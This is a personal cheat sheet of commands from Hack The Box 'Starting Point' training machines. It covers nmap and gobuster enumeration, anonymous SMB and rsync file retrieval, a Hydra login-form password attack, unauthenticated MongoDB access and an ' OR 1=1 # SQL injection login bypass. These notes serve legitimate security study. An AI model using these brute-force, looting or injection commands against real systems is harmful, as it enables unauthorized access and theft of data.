# HTB Notes

## Starting Point Tier 0

Nmap basic list
`nmap -v1 -Pn 123.456.789.0`

SMB List Shares
`smbclient --list 10.129.49.171`

SMB List Folders
`smbmap -u root -p "" -H 10.129.49.171 -r`

SMB Folder Content
`smbmap -u root -p "" -H 10.129.49.171 -R WorkShares`

SMB Download files
`smbmap -u root -p "" -H 10.129.49.171 --download 'WorkShares\James.P\flag.txt'`

### Explosion

Unix RDP Connection
`xfreerdp /v:10.1.1.1 /u:administrator`

### Preignition

GoBuster find files / directories on Web Sever ending in PHP using Wordlist
`gobuster dir --url 10.129.38.239 --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php`

Hydra Login Form attack using HTTP Form Post
`hydra -l admin -P Passwords/2020-200_most_used_passwords.txt 10.129.116.45 http-post-form "/admin.php:username=^USER^&password=^PASS^:Wrong" -v`

### Mongod

Nmap scan all ports fast (does not work in nmapgui)
`nmap -p- --min-rate=1000 -sV {target_IP}`

MongoDB Shell Connect
`mongosh {target_IP}`

Mongo List Databases
`show databases`

Mongo Show Collection Content
`db.{collection_name}.find().pretty()`

### Synced

Rsync list shares
`rsync --list-only {target_IP}::`

Rsync copy file to local
`rsync 10.129.228.37::public/flag.txt ./flag.txt`

## Starting Point Tier 1

### Appointment

MySQL Injection Example Server query
`$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";`

Injection Attack
$username = admin
$password = ' OR 1=1 #
`$sql="SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 #'";`

### Sequel


